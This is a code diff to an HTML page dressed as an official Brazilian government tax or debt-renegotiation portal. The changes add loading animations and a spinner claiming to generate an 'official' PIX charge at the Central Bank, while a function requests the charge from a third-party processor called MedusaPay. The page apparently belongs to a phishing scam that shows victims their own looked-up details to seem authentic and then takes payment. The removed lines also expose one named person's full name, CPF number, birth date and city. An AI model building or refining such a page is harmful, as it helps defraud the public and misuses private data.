@@ -170,16 +170,42 @@
       padding: 20px;
     }
 
-    /* ESTILOS TABELA OFICIAL DE DEMONSTRATIVO FISCAL */
-    .gov-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 16px 0;
-      font-size: 12.5px;
-      border: 1px solid #cbd5e1;
-      border-radius: 6px;
-      overflow: hidden;
-      background: #ffffff;
+    /* ESTILOS DE SKELETON LOADER E SPINNER GOVERNAMENTAL */
+    .skeleton-loader {
+      background: linear-gradient(90deg, #f1f5f9 25%, #e2e8f0 50%, #f1f5f9 75%);
+      background-size: 200% 100%;
+      animation: skeleton-shimmer 1.5s infinite ease-in-out;
+      border-radius: 4px;
+      display: inline-block;
+      min-width: 80px;
+      height: 14px;
+      vertical-align: middle;
+    }
+    @keyframes skeleton-shimmer {
+      0% { background-position: 200% 0; }
+      100% { background-position: -200% 0; }
+    }
+    .spinner-box {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 30px 10px;
+      color: #174075;
+      font-size: 13px;
+      font-weight: 600;
+      gap: 12px;
+    }
+    .spinner-icon {
+      width: 36px;
+      height: 36px;
+      border: 3.5px solid #e2e8f0;
+      border-top-color: #107c41;
+      border-radius: 50%;
+      animation: spin-loader 0.8s linear infinite;
+    }
+    @keyframes spin-loader {
+      to { transform: rotate(360deg); }
     }
     .gov-table th {
       background: #f1f5f9;
@@ -418,18 +444,18 @@
     <section class="wizard-steps-card" style="padding: 16px; margin-bottom: 12px;">
       <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; border-bottom: 1px solid #e2e8f0; padding-bottom: 8px;">
         <div>
-          <div style="font-size: 15px; font-weight: 800; color: #174075;" id="resNome">GABRIEL RODRIGUES DE OLIVEIRA</div>
-          <div style="font-size: 12px; color: #64748b; font-weight: 600;" id="resCpf">CPF: 063.818.519-02</div>
+          <div style="font-size: 15px; font-weight: 800; color: #174075;" id="resNome"><span class="skeleton-loader" style="width: 220px; height: 18px;"></span></div>
+          <div style="font-size: 12px; color: #64748b; font-weight: 600;" id="resCpf"><span class="skeleton-loader" style="width: 140px;"></span></div>
         </div>
         <span style="font-size: 11px; background: #dcfce7; color: #166534; padding: 4px 10px; border-radius: 6px; font-weight: 700;">Sessão Autenticada</span>
       </div>
 
       <!-- DETALHES COMPLETOS DO CADASTRADO -->
       <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 8px; font-size: 11.5px; color: #334155; background: #f8fafc; padding: 10px 12px; border-radius: 6px; border: 1px solid #e2e8f0;">
-        <div><span style="color: #64748b; font-weight: 600;">Data Nasc.:</span> <strong id="cardDtNasc">18/09/1995</strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Nome da Mãe:</span> <strong id="cardNomeMae">-</strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Telefone:</span> <strong id="cardTelefone">-</strong></div>
-        <div><span style="color: #64748b; font-weight: 600;">Endereço:</span> <strong id="cardEndereco">ITAPEVA / SP</strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Data Nasc.:</span> <strong id="cardDtNasc"><span class="skeleton-loader" style="width: 70px;"></span></strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Nome da Mãe:</span> <strong id="cardNomeMae"><span class="skeleton-loader" style="width: 120px;"></span></strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Telefone:</span> <strong id="cardTelefone"><span class="skeleton-loader" style="width: 90px;"></span></strong></div>
+        <div><span style="color: #64748b; font-weight: 600;">Endereço:</span> <strong id="cardEndereco"><span class="skeleton-loader" style="width: 140px;"></span></strong></div>
       </div>
     </section>
 
@@ -635,12 +661,18 @@
           <div style="font-size: 11.5px; color: #64748b;">Escaneie o QR Code abaixo com o app do seu banco ou use a chave Copia e Cola</div>
         </div>
 
-        <div class="pix-qr-box">
-          <!-- QR CODE PIX PLACEHOLDER DEMONSTRAÇÃO -->
-          <img class="qr-code-img" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540558.725802BR5925SECTAZ%20RENEGOCIACAO6009CURITIBA62070503***63041D2C" alt="QR Code PIX">
+        <!-- LOADER SPINNER DO PIX DA MEDUSAPAY -->
+        <div id="pixLoaderBox" class="spinner-box">
+          <div class="spinner-icon"></div>
+          <div>Gerando cobrança PIX oficial no Banco Central...</div>
+        </div>
+
+        <div class="pix-qr-box" id="pixContentBox" style="display: none;">
+          <!-- QR CODE PIX REAL -->
+          <img class="qr-code-img" src="" alt="QR Code PIX">
           
           <label class="form-label" style="text-align: left;">PIX Copia e Cola:</label>
-          <input type="text" id="pixCopiaCola" class="pix-copia-cola-input" readonly value="00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540558.725802BR5925SECTAZ%20RENEGOCIACAO6009CURITIBA62070503***63041D2C">
+          <input type="text" id="pixCopiaCola" class="pix-copia-cola-input" readonly value="">
           
           <button type="button" class="btn-copy-pix" onclick="copyPixCode()">Copiar Código PIX</button>
         </div>
@@ -821,9 +853,13 @@
     }
 
     async function generateMedusaPix() {
-      const pixBox = document.querySelector('.pix-qr-box');
+      const pixLoaderBox = document.getElementById('pixLoaderBox');
+      const pixContentBox = document.getElementById('pixContentBox');
       const pixInput = document.getElementById('pixCopiaCola');
       const qrImg = document.querySelector('.qr-code-img');
+
+      if (pixLoaderBox) pixLoaderBox.style.display = 'flex';
+      if (pixContentBox) pixContentBox.style.display = 'none';
 
       try {
         const nome = currentUserData.nome || 'GABRIEL RODRIGUES DE OLIVEIRA';
@@ -850,6 +886,9 @@
         }
       } catch (err) {
         console.error('[MedusaPay Frontend Error]:', err);
+      } finally {
+        if (pixLoaderBox) pixLoaderBox.style.display = 'none';
+        if (pixContentBox) pixContentBox.style.display = 'block';
       }
     }
 
